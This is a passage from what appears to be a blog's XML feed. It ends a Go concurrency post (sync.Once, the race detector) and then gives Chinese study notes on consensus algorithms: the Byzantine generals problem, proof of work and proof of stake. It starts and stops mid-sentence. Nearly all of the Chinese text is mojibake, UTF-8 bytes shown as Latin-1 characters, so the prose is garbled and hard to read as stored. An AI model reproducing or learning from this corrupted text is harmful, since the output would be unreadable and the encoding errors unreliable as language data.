·åœ¨å¹¶å‘æƒ…å†µä¸‹å¯ä»¥ä¿è¯åªæœ‰ä¸€ä¸ªçº¿ç¨‹ä¼šæ‰§è¡Œï¼Œå†åˆ¤æ–­ä¸€æ¬¡å½“å‰doneå­—æ®µæ˜¯å¦å‘ç”Ÿæ”¹å˜(ä¸ºä»€ä¹ˆè¿™é‡Œè¿˜è¦åœ¨åˆ¤æ–­ä¸€æ¬¡flagï¼Ÿè¿™é‡Œç›®çš„å…¶å®å°±æ˜¯ä¿è¯å¹¶å‘çš„æƒ…å†µä¸‹ï¼Œä»£ç å—ä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œæ¯•ç«ŸåŠ é”æ˜¯åœ¨doslow()æ–¹æ³•å†…ï¼Œä¸åŠ è¿™ä¸ªåˆ¤æ–­çš„åœ¨å¹¶å‘æƒ…å†µä¸‹å°±ä¼šå‡ºç°å…¶ä»–goroutineä¹Ÿèƒ½æ‰§è¡Œf())ï¼Œå¦‚æœæœªå‘ç”Ÿæ”¹å˜ï¼Œåˆ™å¼€å§‹æ‰§è¡Œä»£ç å—ï¼Œä»£ç å—è¿è¡Œç»“æŸåä¼šå¯¹doneå­—æ®µåšåŸå­æ“ä½œï¼Œæ ‡è¯†è¯¥ä»£ç å—å·²ç»è¢«æ‰§è¡Œè¿‡äº†.</p><h3 id="ç«äº‰æ¡ä»¶æ£€æµ‹"><a href="#ç«äº‰æ¡ä»¶æ£€æµ‹" class="headerlink" title="ç«äº‰æ¡ä»¶æ£€æµ‹"></a>ç«äº‰æ¡ä»¶æ£€æµ‹</h3><p>Goçš„runtimeå’Œå·¥å…·é“¾ä¸ºæˆ‘ä»¬è£…å¤‡äº†ä¸€ä¸ªå¤æ‚ä½†å¥½ç”¨çš„åŠ¨æ€åˆ†æå·¥å…·ï¼Œç«äº‰æ£€æŸ¥å™¨(the race detector)ã€‚</p><p>åªè¦åœ¨go buildï¼Œgo runæˆ–è€…go testå‘½ä»¤åé¢åŠ ä¸Š-raceçš„flagï¼Œå°±ä¼šä½¿ç¼–è¯‘å™¨åˆ›å»ºä¸€ä¸ªä½ çš„åº”ç”¨çš„â€œä¿®æ”¹â€ç‰ˆæˆ–è€…ä¸€ä¸ªé™„å¸¦äº†èƒ½å¤Ÿè®°å½•æ‰€æœ‰è¿è¡ŒæœŸå¯¹å…±äº«å˜é‡è®¿é—®å·¥å…·çš„testï¼Œå¹¶ä¸”ä¼šè®°å½•ä¸‹æ¯ä¸€ä¸ªè¯»æˆ–è€…å†™å…±äº«å˜é‡çš„goroutineçš„èº«ä»½ä¿¡æ¯ã€‚</p><p>ç”±äºéœ€è¦é¢å¤–çš„è®°å½•ï¼Œå› æ­¤æ„å»ºæ—¶åŠ äº†ç«äº‰æ£€æµ‹çš„ç¨‹åºè·‘èµ·æ¥ä¼šæ…¢ä¸€äº›ï¼Œä¸”éœ€è¦æ›´å¤§çš„å†…å­˜</p><p><a href="https://juejin.cn/post/6844903918233714695">raceä½¿ç”¨æŒ‡å—</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>GO</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…±è¯†ç®—æ³•å­¦ä¹ è®°å½•</title>
    <link href="/2022/08/06/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/08/06/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="å…±è¯†ç®—æ³•å­¦ä¹ è®°å½•"><a href="#å…±è¯†ç®—æ³•å­¦ä¹ è®°å½•" class="headerlink" title="å…±è¯†ç®—æ³•å­¦ä¹ è®°å½•"></a>å…±è¯†ç®—æ³•å­¦ä¹ è®°å½•</h1><p>åŒ…æ‹¬POW,POS,DPOS,PBFT,RAFT</p><h2 id="å­¦ä¹ èµ„æ–™"><a href="#å­¦ä¹ èµ„æ–™" class="headerlink" title="å­¦ä¹ èµ„æ–™"></a>å­¦ä¹ èµ„æ–™</h2><p><a href="https://www.cnblogs.com/ACaiGarden/p/15087042.html">åŒºå—é“¾å…±è¯†ç®—æ³•ç»¼è¿°</a></p><h2 id="æ‹œå åº­å°†å†›é—®é¢˜"><a href="#æ‹œå åº­å°†å†›é—®é¢˜" class="headerlink" title="æ‹œå åº­å°†å†›é—®é¢˜"></a>æ‹œå åº­å°†å†›é—®é¢˜</h2><p>ã€Œæ‹œå åº­å°†å†›é—®é¢˜ã€æ¥æºäºè¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼šæ‹œå åº­å¸å›½çš„å†›é˜Ÿæ­£åœ¨å›´æ”»ä¸€åº§åŸå¸‚ã€‚è¿™æ”¯å†›é˜Ÿè¢«åˆ†æˆäº†å¤šæ”¯å°åˆ†é˜Ÿï¼Œé©»æ‰åœ¨åŸå¸‚å‘¨å›´çš„ä¸åŒæ–¹ä½ï¼Œæ¯æ”¯å°åˆ†é˜Ÿç”±ä¸€ä¸ªå°†å†›é¢†å¯¼ã€‚è¿™äº›å°†å†›ä»¬å½¼æ­¤ä¹‹é—´åªèƒ½ä¾é ä¿¡ä½¿ä¼ é€’æ¶ˆæ¯ï¼ˆæ— æ³•èšåœ¨ä¸€èµ·å¼€ä¸ªä¼šï¼‰ã€‚æ¯ä¸ªå°†å†›åœ¨è§‚å¯Ÿè‡ªå·±æ–¹ä½çš„æ•Œæƒ…ä»¥åï¼Œä¼šç»™å‡ºä¸€ä¸ªå„è‡ªçš„è¡ŒåŠ¨å»ºè®®ï¼ˆæ¯”å¦‚è¿›æ”»ã€æ’¤é€€æˆ–æŒ‰å…µä¸åŠ¨ï¼‰ï¼Œä½†æœ€ç»ˆçš„éœ€è¦å°†å†›ä»¬è¾¾æˆä¸€è‡´çš„ä½œæˆ˜è®¡åˆ’å¹¶å…±åŒæ‰§è¡Œï¼Œå¦åˆ™å°±ä¼šè¢«æ•Œäººå„ä¸ªå‡»ç ´ã€‚ä½†æ˜¯ï¼Œè¿™äº›å°†å†›ä¸­å¯èƒ½æœ‰å›å¾’ï¼Œä»–ä»¬ä¼šå°è¯•é˜»æ­¢å…¶ä»–å¿ è¯šçš„å°†å†›è¾¾æˆä¸€è‡´çš„ä½œæˆ˜è®¡åˆ’ã€‚</p><p>è¿™å°±æ˜¯æ‹œå åº­å°†å†›çš„ã€Œé—®é¢˜ã€ï¼šåªèƒ½ä¾é é€šä¿¡ç›¸äº’äº¤æµï¼Œåˆä¸çŸ¥é“è°æ˜¯å›å¾’ï¼Œæ€ä¹ˆèƒ½ä¸å—å›å¾’ä»¬çš„å½±å“ï¼Œè®©è¿™äº›å¿ è¯šçš„å°†å†›å¿«é€Ÿçš„è¾¾åˆ°ä¸€è‡´çš„ä½œæˆ˜è®¡åˆ’å‘¢ï¼Ÿ</p><p>å¾ˆæ˜¾ç„¶ï¼Œå°†è¿™ä¸€åœºæ™¯å¥—ç”¨åˆ°è®¡ç®—æœºç³»ç»Ÿä¸­ä¹Ÿæ˜¯éå¸¸é€‚ç”¨çš„ï¼šåœ¨ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œé’ˆå¯¹æ¯ä¸ªè¿ç®—ï¼Œæ¯å°ç‹¬ç«‹çš„æœºå™¨ä¹Ÿéœ€è¦æœ€ç»ˆè¾¾æˆä¸€è‡´çš„ç»“æœã€‚ä½†æ¯å°è®¡ç®—æœºä¹‹é—´ä¹Ÿåªèƒ½ä¾é ç½‘ç»œé€šä¿¡ï¼ˆæ˜¾ç„¶å®ƒä»¬æ— æ³•èšåœ¨ä¸€èµ·å¼€ä¼šï¼‰ï¼Œæ¯å°è®¡ç®—æœºéƒ½æœ‰å‡ºé”™çš„å¯èƒ½ï¼ˆè¢«æ”»å‡»ï¼Œæˆ–æ•…éšœï¼‰ï¼Œä»è€Œå˜æˆã€Œå›å¾’ã€å¹²æ‰°æ­£å¸¸çš„è®¡ç®—æœºè¾¾æˆä¸€è‡´ã€‚</p><p>è¿™ä¸€é—®é¢˜æ˜¯ç”± LeslieÂ·Lamport ç­‰äººåœ¨<a href="https://www-inst.eecs.berkeley.edu/~cs162/sp16/static/readings/Original_Byzantine.pdf">è¿™ç¯‡è®ºæ–‡</a>ä¸­æå‡ºçš„ï¼Œå¹¶åœ¨è®ºæ–‡ä¸­ç»™å‡ºäº†ç†è®ºå¯è¡Œçš„è§£å†³æ–¹æ¡ˆå’Œè¯æ˜ã€‚äº‹å®ä¸Š, æ‹œå åº­å°†å†›é—®é¢˜æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿé¢†åŸŸæœ€å¤æ‚çš„<strong>å®¹é”™æ¨¡å‹</strong>, å®ƒæè¿°äº†å¦‚ä½•åœ¨å­˜åœ¨æ¶æ„è¡Œä¸º(å¦‚æ¶ˆæ¯ç¯¡æ”¹æˆ–ä¼ªé€ )çš„æƒ…å†µä¸‹ä½¿åˆ†å¸ƒå¼ç³»ç»Ÿè¾¾æˆä¸€è‡´ã€‚ æ˜¯æˆ‘ä»¬ç†è§£åˆ†å¸ƒå¼ä¸€è‡´æ€§åè®®å’Œç®—æ³•çš„é‡è¦åŸºç¡€ã€‚</p><p>è®ºæ–‡ä¸­ç»™å‡ºäº†ä¸€ä¸ªç»“è®º: å¦‚æœå­˜åœ¨<em>m</em>ä¸ªå›å°†, é‚£ä¹ˆè‡³å°‘éœ€è¦<em>3m+1</em>ä¸ªå°†å†›, æ‰èƒ½æœ€ç»ˆè¾¾åˆ°ä¸€è‡´çš„è¡ŒåŠ¨æ–¹æ¡ˆã€‚</p><p>Leslie Lamportåœ¨è®ºæ–‡ä¸­ç»™å‡ºäº†ä¸¤ç§æ‹œå åº­å°†å†›é—®é¢˜çš„è§£å†³æ–¹æ¡ˆ, å³å£ä¿¡æ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ(A solution with oral message)å’Œç­¾åæ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ(A solution with signed message).</p><h3 id="å£ä¿¡æ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ"><a href="#å£ä¿¡æ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ" class="headerlink" title="å£ä¿¡æ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ"></a>å£ä¿¡æ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ</h3><p>é¦–å…ˆ, æ‰€è°“å£å¤´æ¶ˆæ¯ï¼Œæ˜¯æŒ‡å†…å®¹å®Œå…¨ç”±å‘é€è€…æˆ–è½¬å‘è€…æ§åˆ¶çš„æ¶ˆæ¯ã€‚éœ€è¦å¯¹æ¶ˆæ¯ä¼ é€’ç³»ç»Ÿä½œå¦‚ä¸‹çš„é™åˆ¶ï¼š</p><ul><li>A1. ä»»ä½•å·²ç»å‘é€çš„æ¶ˆæ¯éƒ½å°†è¢«æ­£ç¡®ä¼ è¾¾</li><li>A2. æ¶ˆæ¯çš„æ¥æ”¶è€…çŸ¥é“æ˜¯è°å‘é€äº†æ¶ˆæ¯</li><li>A3. æ¶ˆæ¯çš„ç¼ºå¸­å¯ä»¥è¢«æ£€æµ‹</li></ul><p>A1 å’Œ A2 å¯ä»¥é˜²æ­¢å›å¾’å¹²æ‰°ä¸¤ä¸ªå°†å†›ä¹‹é—´çš„é€šä¿¡ï¼šA1 è®©å›å¾’æ— æ³•åœ¨é€šä¿¡è¿‡ç¨‹ä¸­ä¿®æ”¹ä¿¡æ¯ï¼›A2 è®©å›å¾’æ— æ³•å†’å……å…¶å®ƒå°†å†›å‘é€æ¶ˆæ¯ã€‚A3 å¯ä»¥é˜²æ­¢å›å¾’é€šè¿‡ä¸å‘æ¶ˆæ¯çš„æ–¹å¼å½±å“ä¸€è‡´å…±è¯†çš„è¾¾æˆã€‚å¹¶ä¸”å¦‚æœå°†å†›ä»¬å‘ç°ç¼ºå°‘æŸä¸ªæ¶ˆæ¯ï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨ç»Ÿä¸€çš„é»˜è®¤å€¼ï¼ˆæ¯”å¦‚RETREATï¼‰æ¥æ›¿ä»£ç¼ºå¤±çš„æ¶ˆæ¯ã€‚</p><h3 id="ç­¾åæ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ"><a href="#ç­¾åæ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ" class="headerlink" title="ç­¾åæ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ"></a>ç­¾åæ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆ</h3><p>å£å¤´æ¶ˆæ¯çš„è§£å†³æ–¹æ¡ˆä¹‹æ‰€ä»¥å¤æ‚ï¼Œå°±æ˜¯å› ä¸ºå›å¾’å¯ä»¥éšæ„æ”¹æ›´å¿ è¯šå°†å†›çš„æ¶ˆæ¯ï¼Œè€Œåˆ«äººæ— æ³•å‘ç°æ¶ˆæ¯è¢«æ”¹ã€‚å¦‚æœæˆ‘ä»¬è®©å¿ è¯šå°†å†›çš„æ¶ˆæ¯æ— æ³•ç¯¡æ”¹ï¼Œé‚£ä¹ˆé—®é¢˜å°±å˜å¾—ç®€å•å¤šäº†ã€‚è¿™å°±æ˜¯ç­¾åæ¶ˆæ¯çš„è§£å†³æ–¹æ¡ˆã€‚æ‰€ä»¥, ç­¾åæ¶ˆæ¯çš„é™åˆ¶æ˜¯åœ¨å£ä¿¡æ¶ˆæ¯å®šä¹‰çš„åŸºç¡€ä¸Šå¢åŠ äº†å¦‚ä¸‹ä¸¤æ¡:</p><ul><li>A4. å¿ è¯šå°†å†›çš„ç­¾åæ— æ³•ä¼ªé€ ï¼Œè€Œä¸”å¯¹ä»–ç­¾åæ¶ˆæ¯çš„å†…å®¹è¿›è¡Œä»»ä½•æ›´æ”¹éƒ½ä¼šè¢«å‘ç°</li><li>A5. ä»»ä½•äººéƒ½èƒ½éªŒè¯å°†å†›ç­¾åçš„çœŸä¼ª</li></ul><p>è¿™é‡Œ<strong>é€šè¿‡æ¶ˆæ¯ä¸å¯ç¯¡æ”¹è¿™ä¸€ç‰¹æ€§ï¼Œè®©æ‰€æœ‰å¿ è¯šå°†å†›æˆä¸ºã€Œä¸€ä½“ã€ï¼Œå°±åƒåŒä¸€ä¸ªäººä¸€æ ·ã€‚</strong></p><p>ç­¾åæ¶ˆæ¯å‹è§£å†³æ–¹æ¡ˆå¯ä»¥å¤„ç†ä»»ä½•æ•°é‡å›å°†çš„åœºæ™¯.</p><h2 id="POW"><a href="#POW" class="headerlink" title="POW"></a>POW</h2><p><strong>å¹²çš„è¶Šå¤šï¼Œè·å¾—è¶Šå¤šã€‚</strong></p><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å·¥ä½œé‡è¯æ˜ï¼ˆPoWï¼ŒProof of Workï¼‰</p><p>ä»£è¡¨é¡¹ç›®ï¼šBTC</p><p>PoWæ˜¯æ˜¯é¦–ä¸ªå…±è¯†ç®—æ³•ã€‚å®ƒæ˜¯ç”±ä¸­æœ¬èªåœ¨ä»–çš„è®ºæ–‡ä¸­æå‡ºçš„ï¼Œç”¨äºå»ºç«‹åˆ†å¸ƒå¼æ— ä¿¡ä»»å…±è¯†å¹¶è¯†åˆ«â€œåŒé‡æ”¯ä»˜â€ï¼ˆdouble spendï¼‰é—®é¢˜ã€‚PoWå¹¶éä¸€ä¸ªæ–°ç†å¿µï¼Œä½†æ˜¯ä¸­æœ¬èªå°†Powä¸åŠ å¯†ç­¾åã€Merkleé“¾å’ŒP2Pç½‘ç»œç­‰å·²æœ‰ç†å¿µç»“åˆï¼Œå½¢æˆä¸€ç§å¯ç”¨çš„åˆ†å¸ƒå¼å…±è¯†ç³»ç»Ÿã€‚</p><p>ç”±äºä¸åŒçš„èŠ‚ç‚¹æ¥å—æ•°æ®æœ‰æ‰€åŒºåˆ«ï¼Œä¸ºäº†ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼Œæ¯ä¸ªåŒºå—æ•°æ®åªèƒ½ç”±ä¸€ä¸ªèŠ‚ç‚¹è¿›è¡Œè®°å½•ã€‚BTCé€šè¿‡POWæ¥ç¡®è®¤è®°è´¦èŠ‚ç‚¹ã€‚æ¯ä¸ªèŠ‚ç‚¹å¦‚æœæƒ³ç”Ÿæˆä¸€ä¸ªæ–°çš„åŒºå—å¹¶å†™å…¥åŒºå—é“¾ï¼Œå¿…é¡»è§£å‡ºæ¯”ç‰¹å¸ç½‘ç»œå‡ºçš„PoWé—®é¢˜ã€‚å…¶å…³é”®çš„è¦ç´ æ˜¯å·¥ä½œé‡è¯æ˜å‡½æ•°ã€åŒºå—ä¿¡æ¯åŠéš¾åº¦å€¼ã€‚å·¥ä½œé‡è¯æ˜å‡½æ•°æ˜¯è¿™é“é¢˜çš„è®¡ç®—æ–¹å¼ï¼ŒåŒºå—å†³å®šäº†è¿™é“é¢˜çš„è¾“å…¥æ•°æ®ï¼Œéš¾åº¦å€¼å†³å®šäº†è¿™é“é¢˜æ‰€éœ€è¦çš„è®¡ç®—é‡ã€‚å¯ä»¥ç®€å•ç†è§£æˆå°±æ˜¯å°†ä¸åŒçš„nonceå€¼ä½œä¸ºè¾“å…¥ï¼Œå°è¯•è¿›è¡ŒSHA256å“ˆå¸Œè¿ç®—ï¼Œæ‰¾å‡ºæ»¡è¶³ç»™å®šæ•°é‡å‰å¯¼0çš„å“ˆå¸Œå€¼çš„è¿‡ç¨‹ã€‚è€Œè¦æ±‚çš„å‰å¯¼0çš„ä¸ªæ•°è¶Šå¤šï¼Œä»£è¡¨éš¾åº¦è¶Šå¤§ã€‚</p><blockquote><p>æ–°éš¾åº¦å€¼=æ—§éš¾åº¦å€¼Ã—ï¼ˆè¿‡å»2016ä¸ªåŒºå—èŠ±è´¹æ—¶é•¿/20160åˆ†é’Ÿï¼‰</p><p>ç›®æ ‡å€¼=æœ€å¤§ç›®æ ‡å€¼/éš¾åº¦å€¼</p><p>å…¶ä¸­æœ€å¤§ç›®æ ‡å€¼ä¸ºä¸€ä¸ªæ’å®šå€¼ï¼Œéš¾åº¦ä¸º1æ—¶çš„ç›®æ ‡å€¼ï¼Œå³2^224ï¼š0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</p><p>æ¯”ç‰¹å¸å·¥ä½œé‡è¯æ˜çš„è¾¾æˆå°±æ˜¯çŸ¿å·¥è®¡ç®—å‡ºæ¥çš„åŒºå—å“ˆå¸Œå€¼å¿…é¡»å°äºç›®æ ‡å€¼</p></blockquote><p>æ¯”ç‰¹å¸èŠ‚ç‚¹æ±‚è§£å·¥ä½œé‡è¯æ˜é—®é¢˜çš„æ­¥éª¤å¤§è‡´å½’çº³å¦‚ä¸‹ï¼š</p><ol><li>ç”Ÿæˆé“¸å¸äº¤æ˜“ï¼Œå¹¶ä¸å…¶ä»–æ‰€æœ‰å‡†å¤‡æ‰“åŒ…è¿›åŒºå—çš„äº¤æ˜“ç»„æˆäº¤æ˜“åˆ—è¡¨ï¼Œé€šè¿‡Merkleæ ‘ç®—æ³•ç”ŸæˆMerkleæ ¹å“ˆå¸Œï¼›</li><li>æŠŠMerkleæ ¹å“ˆå¸ŒåŠå…¶ä»–ç›¸å…³å­—æ®µç»„è£…æˆåŒºå—å¤´ï¼Œå°†åŒºå—å¤´çš„80å­—èŠ‚æ•°æ®ä½œä¸ºå·¥ä½œé‡è¯æ˜çš„è¾“å…¥ï¼›</li><li>ä¸åœåœ°å˜æ›´åŒºå—å¤´ä¸­çš„éšæœºæ•°ï¼Œå³nonceçš„æ•°å€¼ï¼Œå¹¶å¯¹æ¯æ¬¡å˜æ›´åçš„åŒºå—å¤´åšåŒé‡SHA256è¿ç®—ï¼ˆå³SHA256ï¼ˆSHA256ï¼ˆBlock_Headerï¼‰ï¼‰ï¼‰ï¼Œå°†ç»“æœå€¼ä¸å½“å‰ç½‘ç»œçš„ç›®æ ‡å€¼åšå¯¹æ¯”ï¼Œå¦‚æœå°äºç›®æ ‡å€¼ï¼Œåˆ™è§£é¢˜æˆåŠŸï¼Œå·¥ä½œé‡è¯æ˜å®Œæˆã€‚</li></ol><h3 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><p><strong>ä¼˜ç‚¹ï¼š</strong></p><p>1ï¼‰å»ä¸­å¿ƒåŒ–ï¼Œå°†è®°è´¦æƒå…¬å¹³çš„åˆ†æ´¾åˆ°å…¶ä»–èŠ‚ç‚¹ã€‚ä½ èƒ½å¤Ÿè·å¾—çš„å¸çš„æ•°é‡ï¼Œå–å†³äºä½ æŒ–çŸ¿è´¡çŒ®çš„æœ‰æ•ˆå·¥ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ ç”¨äºæŒ–çŸ¿çš„çŸ¿æœºçš„æ€§èƒ½è¶Šå¥½ï¼Œåˆ†ç»™ä½ çš„æ”¶ç›Šå°±ä¼šè¶Šå¤šï¼Œè¿™å°±æ˜¯æ ¹æ®ä½ çš„å·¥ä½œè¯æ˜æ¥æ‰§è¡Œå¸çš„åˆ†é…æ–¹å¼ã€‚</p><p>2ï¼‰å®‰å…¨æ€§é«˜ï¼Œç ´åç³»ç»Ÿéœ€è¦æŠ•å…¥æå¤§çš„æˆæœ¬ï¼Œå¦‚æœæƒ³ä½œå¼Šï¼Œè¦æœ‰å‹å€’å¤§å¤šæ•°äººçš„ç®—åŠ›ï¼ˆ51%æ”»å‡»ï¼‰ã€‚å› ä¸ºä½œå¼Šè¦ä»˜å‡ºä¸€å®šæˆæœ¬ï¼Œä½œå¼Šè€…å°±ä¼šè°¨æ…å¯¹å¾…äº†ã€‚åœ¨æ¯”ç‰¹å¸çš„ PoW æœºåˆ¶ä¸­ï¼Œç”±äºè·å¾—è®¡ç®—ç»“æœçš„æ¦‚ç‡è¶‹è¿‘äºæ‰€å ç®—åŠ›æ¯”ä¾‹ï¼Œå› æ­¤åœ¨ä¸æŒæ¡51%ä»¥ä¸Šç®—åŠ›çš„å‰æä¸‹ï¼ŒçŸ¿å·¥æ¬ºè¯ˆçš„æˆæœ¬è¦æ˜¾è‘—é«˜äºè¯šå®æŒ–çŸ¿ï¼Œç”šè‡³ä¸å¯èƒ½å®Œæˆæ¬ºè¯ˆ(ç”±äºæ¦‚ç‡è¿‡ä½)ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong></p><p>1ï¼‰æŒ–çŸ¿é€ æˆå¤§é‡çš„èµ„æºæµªè´¹ï¼Œç›®å‰bitcoinå·²ç»å¸å¼•å…¨çƒå¤§éƒ¨åˆ†çš„ç®—åŠ›ï¼Œå…¶å®ƒå†ç”¨Powå…±è¯†æœºåˆ¶çš„åŒºå—é“¾åº”ç”¨å¾ˆéš¾è·å¾—ç›¸åŒçš„ç®—åŠ›æ¥ä¿éšœè‡ªèº«çš„å®‰å…¨ã€‚è¿™è®©ä¾æ®ç®—åŠ›å…¬å¹³åˆ†é…å¥–åŠ±çš„æœºåˆ¶ï¼Œæ¼”å˜ä¸ºäº†å¯¹çŸ¿æœºç®—åŠ›çš„å¤§ä¸¾æŠ•å…¥ï¼Œæ‰­æ›²äº†ä¸­æœ¬èªçš„è®¾è®¡åˆè¡·ã€‚</p><p>2ï¼‰ç½‘ç»œæ€§èƒ½å¤ªä½ï¼Œéœ€è¦ç­‰å¾…å¤šä¸ªç¡®è®¤ï¼Œå®¹æ˜“äº§ç”Ÿåˆ†å‰ï¼ŒåŒºå—çš„ç¡®è®¤å…±è¯†è¾¾æˆçš„å‘¨æœŸè¾ƒé•¿ï¼ˆ10åˆ†é’Ÿï¼‰ï¼Œç°åœ¨æ¯ç§’äº¤æ˜“é‡ä¸Šé™æ˜¯7ç¬”ï¼ˆvisaçš„å¹³å‡æ¯ç§’äº¤æ˜“é‡ä¸Šä¸‡ï¼Œæ”¯ä»˜å®å³°å€¼æ¥è¿‘9ä¸‡ï¼‰ï¼Œä¸é€‚åˆå•†ä¸šåº”ç”¨ã€‚</p><p>3ï¼‰PoWå…±è¯†ç®—æ³•ç®—åŠ›é›†ä¸­åŒ–ï¼Œæ…¢æ…¢çš„åç¦»äº†åŸæ¥çš„å»ä¸­å¿ƒåŒ–è½¨é“ã€‚ä»æ¯”ç‰¹å¸æ‰©å®¹ä¹‹äº‰å¯ä»¥çœ‹åˆ°ï¼Œç®—åŠ›é«˜çš„å¤§å‹çŸ¿æ± æ˜¯ä¸»äººï¼Œè€ŒæŒå¸çš„äººæ²¡æœ‰å‚ä¸å†³å®šçš„æƒåˆ©ï¼Œæ¯”ç‰¹å¸åˆ†å‰å‡ºå¾ˆå¤šå„¿å­ï¼Œå³å°†å¤±å»â€œå»ä¸­å¿ƒåŒ–â€çš„æ ‡ç­¾ã€‚</p><h2 id="POS"><a href="#POS" class="headerlink" title="POS"></a>POS</h2><p><strong>æŒæœ‰è¶Šå¤šï¼Œè·å¾—è¶Šå¤šã€‚</strong></p><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>æƒç›Šè¯æ˜ï¼ˆPoSï¼ŒProof of Stakeï¼‰</p><p>ä»¥å¤ªåŠæ­£åœ¨ç”±POWè½¬ä¸ºPOS</p><p>PoS è¯•å›¾è§£å†³ PoW æœºåˆ¶ä¸­å¤§é‡èµ„æºè¢«æµªè´¹çš„æƒ…å†µã€‚</p><p>åœ¨ POW å·¥ä½œé‡è¯æ˜ä¸­ï¼Œä¸»è¦æ˜¯æ ¹æ®ç®—åŠ›æ¥å†³å®šå“ªä¸ªèŠ‚ç‚¹å¯ä»¥è¿›è¡Œç”Ÿäº§æ–°åŒºå—ï¼Œç®—åŠ›è¶Šå¤§æœ‰è¶Šå¤§çš„æ¦‚ç‡è·å¾—æ‰“åŒ…æ–°åŒºå—çš„æœºä¼š; è€Œåœ¨ POS æƒç›Šè¯æ˜ä¸­ä¸»è¦å°±æ˜¯æ ¹æ®è‚¡æƒï¼Œæ‹¥æœ‰çš„è‚¡æƒé«˜å³æœ‰è¶Šé«˜çš„æ¦‚ç‡è·å¾—ç”Ÿäº§æ–°åŒºå—çš„æœºä¼šã€‚</p><p>åœ¨ POS æƒç›Šè¯æ˜å…±è¯†æœºåˆ¶é‡Œæœ‰ä¸ªä¸“æœ‰åæ¬¡å«åšå¸é¾„ã€‚åœ¨ POS æƒç›Šè¯æ˜å…±è¯†ç³»ç»Ÿä¸­çš„æ¯ä¸ªè´§å¸æ¯å¤©éƒ½ä¼šäº§ç”Ÿ 1 å¸é¾„ï¼Œè‹¥ä½ åœ¨æƒç›Šè¯æ˜æœºåˆ¶ä¸­æ‹¥æœ‰ 100 æšè´§å¸å¹¶å­˜æ”¾äº† 10 å¤©ï¼Œä½ çš„å¸é¾„å°±ä¸º 1,000ã€‚è‹¥ä½ æˆåŠŸè¢«ç³»ç»ŸæŒ‘é€‰å‡ºæŒ–æ˜æ–°åŒºå—ï¼Œä½ çš„å¸é¾„ä¼šå½’ 0 å¹¶é‡æ–°å¼€å§‹ç´¯ç§¯è®¡ç®—ï¼Œä½ ä¼šè·å¾—çš„å¥–åŠ±å…¬å¼å¦‚ä¸‹ï¼š</p><blockquote><p>å¥–åŠ± = å¸é¾„ * å¹´åˆ©ç‡ / 365</p></blockquote><p>æ„å‘³ä½ æ¯è¢«æ¸…ç©º 365 å¸é¾„å³ä¼šä»åŒºå—ä¸­ä¼šå¾— N% å¹´åˆ©ç‡çš„è´§å¸å¥–åŠ±ã€‚å‡ä½¿åœ¨ä¸€ä¸ªå½“å‰å¹´åˆ©ç‡ä¸º 5% çš„ç³»ç»Ÿä¸­ï¼Œä½ æ¯æˆåŠŸå¸®å¿™æ‰“åŒ…ä¸€ä¸ªæ–°åŒºå—ä¼šè·å¾—çš„å¥–åŠ±ä¸º 1,000 * 5% / 365 = 0.137 ä¸ªç³»ç»Ÿè´§å¸ã€‚</p><h3 id="ä¼˜ç¼ºç‚¹-1"><a href="#ä¼˜ç¼ºç‚¹-1" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><p><strong>ä¼˜ç‚¹ï¼š</strong></p><p>1ï¼‰åœ¨ä¸€å®šç¨‹åº¦ä¸Šç¼©çŸ­äº†å…±è¯†è¾¾æˆçš„æ—¶é—´ã€‚</p><p>2ï¼‰ä¸å†éœ€è¦å¤§é‡æ¶ˆè€—èƒ½æºæŒ–çŸ¿ã€‚</p><p>3ï¼‰Pos å½“ç„¶ä¹Ÿèƒ½é˜²ä½œå¼Šï¼Œå› ä¸ºå¦‚æœä¸€åæŒæœ‰ 51%ä»¥ä¸Šè‚¡æƒçš„äººä½œå¼Šï¼Œç›¸å½“äºä»–å‘äº†è‡ªå·±ï¼Œå› ä¸ºä¸€ä¸ªäººè‡ªå·±ä¸ä¼šæ€æ­»è‡ªå·±çš„é’±ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong></p><p>1ï¼‰è¿˜æ˜¯éœ€è¦æŒ–çŸ¿ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰è§£å†³å•†ä¸šåº”ç”¨çš„ç—›ç‚¹ï¼›</p><p>2ï¼‰POSé¢ä¸´çš„æœ€ä¸¥é‡çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ— 